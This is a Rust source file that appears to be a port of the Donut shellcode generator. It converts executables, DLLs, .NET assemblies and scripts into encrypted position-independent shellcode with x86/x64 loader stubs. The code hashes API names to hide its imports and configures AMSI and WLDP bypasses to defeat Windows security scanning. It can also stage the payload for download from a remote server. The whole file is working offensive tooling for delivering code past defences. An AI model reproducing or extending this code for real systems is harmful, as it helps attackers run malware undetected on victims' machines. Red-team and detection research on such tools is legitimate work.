use crate::{
    crypt::{encrypt, maru},
    definitions::*,
    loader,
    utils::*,
};
use goblin::pe::PE;
use goblin::pe::utils::get_data;
use std::{
    fs, 
    io::prelude::*,
    path::Path,
};

pub fn donut_from_file(target: String, config: &mut DonutConfig) -> Result<Vec<u8>, String> {
    let file = Path::new(&target);
    let target = if file.exists() {
        fs::read(&target).unwrap()
    } else {
        return Err("Could not find target file".to_string())
    };
    let file_ext = match file.extension() {
        Some(ext) => ext.to_str().unwrap(),
        None => {
            return Err("Could not determine file extension".to_string())
        },
    };
    match file_ext {
        "exe" => {
            match exe_dll_module_type(&target[..], config, true) {
                Ok(_) => {},
                Err(e) => return Err(e),
            }
        },
        "dll" => {
            match exe_dll_module_type(&target[..], config, false) {
                Ok(_) => {},
                Err(e) => return Err(e),
            }
        },
        "xsl" => config.module_type = DONUT_MODULE_XSL,
        "js" => config.module_type = DONUT_MODULE_JS,
        "vbs" => config.module_type = DONUT_MODULE_VBS,
        _ => {},
    } 
    donut_from_bytes(target, config)
}

pub fn donut_from_bytes(target: Vec<u8>, config: &mut DonutConfig) -> Result<Vec<u8>, String> {
    match build_module(target, config) {
        Ok(_) => (),
        Err(e) => return Err(e),
    }

    let mut instance = match build_instance(config) {
        Ok(instance) => instance,
        Err(e) => return Err(e),
    };
    if config.instance_type == DONUT_INSTANCE_HTTP {
        // save module to disk
        instance.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        config.module_data.extend_from_slice(&[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        let mut output_file = fs::File::create(&config.modname).expect("could not write file");
        output_file
            .write_all(&config.module_data)
            .expect("could not write contents to output file");
    }
    
    match build_loader(config, instance) {
        Ok(donut) => return Ok(donut),
        Err(e) => return Err(e),
    }
}

pub fn exe_dll_module_type(target: &[u8], config: &mut DonutConfig, is_exe: bool) -> Result<(), String> {
    match detect_dotnet(&target[..]) {
        Ok(result) => {
            if result.is_dotnet {
                if is_exe {
                    config.module_type = DONUT_MODULE_NET_EXE;
                    config.runtime = result.version;
                } else {
                    config.module_type = DONUT_MODULE_NET_DLL;
                    config.runtime = result.version;
                }
            } else {
                if is_exe {
                    config.module_type = DONUT_MODULE_EXE;
                } else {
                    config.module_type = DONUT_MODULE_DLL;
                }
            }
            return Ok(())
        },
        Err(e) => return Err(e),
    }
}

pub fn detect_dotnet(target: &[u8]) -> Result<DotNetResult, String> {
    let mut result = DotNetResult::default();
    let exe = PE::parse(&target).unwrap();
    let optional_header = match exe.header.optional_header {
        Some(oh) => oh,
        None => {
            result.is_dotnet = false;
            return Ok(result);
        },
    };
    let clr_runtime = match optional_header.data_directories.get_clr_runtime_header() {
        Some(clr) => clr,
        None => {
            result.is_dotnet = false;
            return Ok(result);
        },
    };
    if clr_runtime.virtual_address == 0 {
        return Ok(result)
    }
    result.is_dotnet = true;
    let file_alignment = optional_header.windows_fields.file_alignment;
    let sections = &exe.sections;
    let cli_header_value: CliHeader = match get_data(target, sections, *clr_runtime, file_alignment) {
        Ok(cli) => cli,
        Err(_) => {
            result.is_dotnet = false;
            return Ok(result);
        },
    };
    let metadata_root: MetadataRoot = match get_data(target, sections, cli_header_value.metadata, file_alignment) {
        Ok(meta) => meta,
        Err(_) => {
            result.is_dotnet = false;
            return Ok(result);
        },
    };
    result.version = metadata_root.version.to_string();

    Ok(result)
}

pub fn build_module(target: Vec<u8>, config: &mut DonutConfig) -> Result<(), String> {
    config.module.module_type = config.module_type;
    config.module.thread = config.thread;
    config.module.unicode = config.unicode;
    config.module.compress = config.compress;

    if config.module_type == DONUT_MODULE_NET_DLL || config.module_type == DONUT_MODULE_NET_EXE {
        if &config.domain == "" && config.entropy != DONUT_ENTROPY_NONE {
            // generate a random domain if one is not specified
            config.domain = random_string(DONUT_DOMAIN_LEN);
        } else {
            config.domain = "AAAAAAAA".to_string();
        }
        config.module.domain = to_array_donut_max_name(&config.domain);

        if config.module_type == DONUT_MODULE_NET_DLL {
            config.module.class = to_array_donut_max_name(&config.class);
            config.module.method = to_array_donut_max_name(&config.method);
        }
        
        // use default runtime if one is not specified
        if &config.runtime == "" {
            config.runtime = DONUT_RUNTIME_NET2.to_string();
        }
        config.module.runtime = to_array_donut_max_name(&config.runtime);
    } else if config.module_type == DONUT_MODULE_DLL && &config.method != "" {
        config.module.method = to_array_donut_max_name(&config.method);
    }
    // TODO implement compression
    config.module.zlen = 0;
    config.module.len = target.len() as _;

    if &config.parameters != "" {
        if config.module_type == DONUT_MODULE_EXE {
            if config.entropy != DONUT_ENTROPY_NONE {
                config.module.parameters = to_array_donut_max_name(&format!("{} {}", random_string(DONUT_DOMAIN_LEN), config.parameters));
            } else {
                config.module.parameters = to_array_donut_max_name(&format!("AAAAAAAA {}", config.parameters));
            }
        } else {
            config.module.parameters = to_array_donut_max_name(&config.parameters);
        }
    }

    let mut struct_bytes = unsafe{ any_as_u8_slice(&config.module) }.to_vec();
    
    for _ in 0..8 {
        struct_bytes.pop();
    } 

    config.module_data = struct_bytes;
    config.module_data.extend_from_slice(&target);
    config.module_data.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    Ok(())
}

pub fn build_instance(config: &mut DonutConfig) -> Result<Vec<u8>, String> {
    let donut_instance_ptr = &config.instance as *const _ as *mut std::ffi::c_void;
    let mut buf: Vec<u8> = Vec::with_capacity(std::mem::size_of::<DonutInstance>());
    for _ in 0..std::mem::size_of::<DonutInstance>() {
        buf.push(0u8);
    }
    unsafe {
        std::ptr::copy(buf.as_mut_ptr() as _, donut_instance_ptr, std::mem::size_of::<DonutInstance>());
        buf.set_len(std::mem::size_of::<DonutInstance>());
    }

    config.instance.mod_len = config.module_data.len() as _;
    config.instance.len = 3312 + 352; // struct size
    config.instance.bypass = config.bypass;

    if config.instance_type == DONUT_INSTANCE_EMBED {
        config.instance.len += config.instance.mod_len as u32;
    }

    if config.entropy == DONUT_ENTROPY_DEFAULT {
        config.instance.mod_master_key = generate_bytes();
        config.instance.mod_counter_and_nonce = generate_bytes();
        config.instance.master_key = config.instance.mod_master_key;
        config.instance.counter_and_nonce = config.instance.mod_counter_and_nonce;
        let sig: [u8; DONUT_MAX_NAME]  = to_array_usize(&random_string(DONUT_SIG_LEN));
        config.instance.sig = sig;

        // maru
        let iv_arr: [u8; MARU_IV_LEN] = generate_bytes();
        let iv = array_to_u64(iv_arr);
        config.instance.iv = iv;
        config.instance.mac = maru(sig, iv);
    }

    // get APIs 
    let api_imports = generate_api_imports();
    if api_imports.len() >= 64 {
        return Err("more than 64 APIs".to_string())
    }

    let mut i = 0;
    for api in &api_imports {
        // calculate hash for API string
        let mod_as_arr: [u8; DONUT_MAX_NAME] = to_array_usize(&api.module);
        let dll_hash = maru(mod_as_arr, config.instance.iv);
        
        // XOR with DLL hash and store in instance
        let name_as_arr: [u8; DONUT_MAX_NAME] = to_array_usize(&api.name);
        config.instance.hash[i] = maru(name_as_arr, config.instance.iv) ^ dll_hash;
        i += 1;
    }
    // save amount of APIs to resolve
    config.instance.api_cnt = api_imports.len() as _;
    config.instance.dll_names = to_array_usize("ole32;oleaut32;wininet;mscoree;shell32");

    // if module is .NET
    if config.module_type == DONUT_MODULE_NET_EXE || config.module_type == DONUT_MODULE_NET_DLL {
        config.instance.xIID_AppDomain = xIID_AppDomain;
        config.instance.xIID_ICLRMetaHost = xIID_ICLRMetaHost;
        config.instance.xCLSID_CLRMetaHost = xCLSID_CLRMetaHost;
        config.instance.xIID_ICLRRuntimeInfo = xIID_ICLRRuntimeInfo;
        config.instance.xIID_ICorRuntimeHost = xIID_ICorRuntimeHost;
        config.instance.xCLSID_CorRuntimeHost = xCLSID_CorRuntimeHost;
    } else if config.module_type == DONUT_MODULE_VBS || config.module_type == DONUT_MODULE_JS {
        config.instance.xIID_IUnknown = xIID_IUnknown;
        config.instance.xIID_IDispatch = xIID_IDispatch;
        config.instance.xIID_IHost = xIID_IHost;
        config.instance.xIID_IActiveScript = xIID_IActiveScript;
        config.instance.xIID_IActiveScriptSite = xIID_IActiveScriptSite;
        config.instance.xIID_IActiveScriptSiteWindow = xIID_IActiveScriptSiteWindow;
        config.instance.xIID_IActiveScriptParse32 = xIID_IActiveScriptParse32;
        config.instance.xIID_IActiveScriptParse64 = xIID_IActiveScriptParse64;

        config.instance.wscript = to_array_usize("WScript");
        config.instance.wscript_exe = to_array_usize("wscript.exe");
        if config.module_type == DONUT_MODULE_VBS {
            config.instance.xCLSID_ScriptLanguage = xCLSID_VBScript;
        } else {
            config.instance.xCLSID_ScriptLanguage = xCLSID_JScript;
        }
    }
    
    // required to disable AMSI
    config.instance.clr = to_array_usize("clr");
    config.instance.amsi = to_array_usize("amsi");
    config.instance.amsi_init = to_array_usize("AmsiInitialize");
    config.instance.amsi_scan_buf = to_array_usize("AmsiScanBuffer");
    config.instance.amsi_scan_str = to_array_usize("AmsiScanString");

    // stuff for the PE loader
    if config.parameters.len() > 0 {
        config.instance.dataname = to_array_usize(".data");
        config.instance.kernelbase = to_array_usize("kernelbase");
        config.instance.cmd_syms = to_array_usize("_acmdln;__argv;__p__acmdln;__p___argv;_wcmdln;__wargv;__p__wcmdln;__p___wargv");
    }
    if config.thread != 0 {
        config.instance.exit_api = to_array_usize("ExitProcess;exit;_exit;_cexit;_c_exit;quick_exit;_Exit");
    }

    // required to disable WLDP
    config.instance.wldp = to_array_usize("wldp");
    config.instance.wldp_query = to_array_usize("WldpQueryDynamicCodeTrust");
    config.instance.wldp_is_approved = to_array_usize("WldpIsClassInApprovedList");

    // set the type of instance we are creating
    config.instance.instance_type = config.instance_type;

    // indicate if we should call RtlExitUserProcess to terminate host process
    config.instance.exit_opt = config.exit_opt;
    // set the fork option
    config.instance.oep = config.oep;
    //set the entropy level
    config.instance.entropy = config.entropy;

    // if module will be downloaded
    // set the URL param and req type
    if config.instance.instance_type == DONUT_INSTANCE_HTTP {
        if &config.modname != "" {
            if config.entropy != DONUT_ENTROPY_NONE {
                config.module.parameters = to_array_donut_max_name(&format!("{} {}", random_string(DONUT_DOMAIN_LEN), config.parameters));
            } else {
                config.module.parameters = to_array_donut_max_name(&format!("AAAAAAAA {}", config.parameters));
            }
        }
        // append module name
        config.instance.server = to_array_usize(&format!("{}/{}", config.server, config.modname));
        // set req type
        config.instance.http_req = to_array_usize("GET");
    }

    config.instance_len = config.instance.len;

    if config.instance.instance_type == DONUT_INSTANCE_HTTP && config.entropy == DONUT_ENTROPY_DEFAULT {
        config.module.mac = maru(config.instance.sig, config.instance.iv);
        config.module_data = encrypt(
            config.instance.mod_master_key,
            config.instance.mod_counter_and_nonce,
            config.module_data.clone() // this is the raw module
        );
        let struct_bytes: &[u8] = unsafe{ any_as_u8_slice(&config.instance) };
        let mut buf: Vec<u8> = struct_bytes.to_vec();
        while buf.len() < (config.instance.len as usize - 16) {
            buf.extend_from_slice(&[0x00]);
        }
        return Ok(buf)
    }

    // DONUT_INSTANCE_EMBED
    let struct_bytes: &[u8] = unsafe{ any_as_u8_slice(&config.instance) };
    let mut buf: Vec<u8> = struct_bytes.to_vec();
    
    // read module into buf
    buf.extend_from_slice(&config.module_data);

    while buf.len() < config.instance.len as usize {
        buf.extend_from_slice(&[0x00])
    }
    
    if config.entropy != DONUT_ENTROPY_DEFAULT {
        return Ok(buf)
    }

    // encrypt instance
    let offset = 
        4 + // len u32
        16 + 16 + // cipher key length + cipher block length, instance crypt
        4 + // pad
        8 + // IV
        (64 * 8) + // hashes (64 uuids of len 64 bit)
        4 + // exit_opt
        4 + // entropy
        8 // OEP
    ; // total = 576

    let encrypted_buf = encrypt(
        config.instance.mod_master_key,
        config.instance.mod_counter_and_nonce,
        buf[offset..].to_vec() // this is the raw instance
    );
    let mut donut_instance: Vec<u8> = Vec::new();
    donut_instance.extend_from_slice(&buf[..offset]); // unencrypted header
    donut_instance.extend_from_slice(&encrypted_buf); // encrypted body

    Ok(donut_instance)
}

pub fn build_loader(config: &mut DonutConfig, instance: Vec<u8>) -> Result<Vec<u8>, String> {
    let mut buf: Vec<u8> = Vec::new();
    buf.extend_from_slice(&[0xe8]); // call $+
    buf.extend_from_slice(&pack(instance.len() as u32)); // instance length
    buf.extend_from_slice(&instance); // instance
    buf.extend_from_slice(&[0x59]); // pop ecx

    let mut pic_len = instance.len() + 32;

    match config.arch {
        DONUT_ARCH_X86 => {
            buf.extend_from_slice(&[0x5a, 0x51, 0x52]); // pop edx, push ecx, push edx
            let loader_x86 = loader::loader_x86();
            buf.extend_from_slice(&loader_x86);
            pic_len += loader_x86.len();
        },
        DONUT_ARCH_X64 => {
            let loader_x64 = loader::loader_x64();
            buf.extend_from_slice(&loader_x64);
            pic_len += loader_x64.len();
        },
        DONUT_ARCH_X84 => {
            buf.extend_from_slice(&[0x31]); // xor eax, eax
            buf.extend_from_slice(&[0xc0]);
            buf.extend_from_slice(&[0x48]); // dec ecx
            buf.extend_from_slice(&[0x0f]); // js dword x86_code, skips length of x64 code
            buf.extend_from_slice(&[0x88]);
            let loader_x64 = loader::loader_x64();
            buf.extend_from_slice(&pack(loader_x64.len() as u32));
            buf.extend_from_slice(&loader_x64);
            buf.extend_from_slice(&[0x5a, 0x51, 0x52]); // pop edx, push ecx, push edx
            let loader_x86 = loader::loader_x86();
            buf.extend_from_slice(&loader_x86);

            pic_len += loader_x86.len();
            pic_len += loader_x64.len();
        },
        _ => return Err("architecture error".to_string()),
    }
    
    for _ in 0..(pic_len-buf.len()) {
        buf.extend_from_slice(&[0x00]);
    }

    Ok(buf)
}

pub fn create_config(cli: &DonutParser, config: &mut DonutConfig) {
    let cli = cli.clone();
    // MODULE OPTIONS
    match cli.modname {
        Some(val) => config.modname = val,
        None => (),
    }
    match cli.server {
        Some(val) => config.server = val,
        None => config.instance_type = DONUT_INSTANCE_EMBED,
    }
    config.entropy = cli.entropy;
    // PIC/SHELLCODE OPTIONS
    config.arch = cli.arch;
    config.bypass = cli.bypass;
    match cli.oep {
        Some(val) => config.oep = val,
        None => (),
    }
    config.exit_opt = cli.exit_opt;
    // FILE OPTIONS
    match cli.class {
        Some(val) => config.class = val,
        None => (),
    }
    match cli.domain {
        Some(val) => config.domain = val,
        None => (),
    }
    match cli.method {
        Some(val) => config.method = val,
        None => (),
    }
    match cli.parameters {
        Some(val) => config.parameters = val,
        None => (),
    }
    match cli.unicode {
        Some(val) => config.unicode = val,
        None => (),
    }
    match cli.runtime {
        Some(val) => config.runtime = val,
        None => (),
    }
    match cli.thread {
        Some(val) => config.thread = val,
        None => (),
    }
    config.compress = cli.compress;
}
